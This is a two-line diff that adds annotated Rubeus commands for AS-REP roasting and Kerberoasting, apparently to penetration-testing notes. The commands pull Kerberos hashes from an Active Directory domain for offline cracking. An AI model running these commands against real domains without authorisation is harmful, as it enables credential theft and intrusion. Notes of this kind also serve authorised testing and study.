@@ -1,1 +1,2 @@
-
+ .\Rubeus.exe asreproast /nowrap  <-- asreproast
+ .\Rubeus.exe kerberoast /outfile:hashes.kerberoast  <-- kerberoast
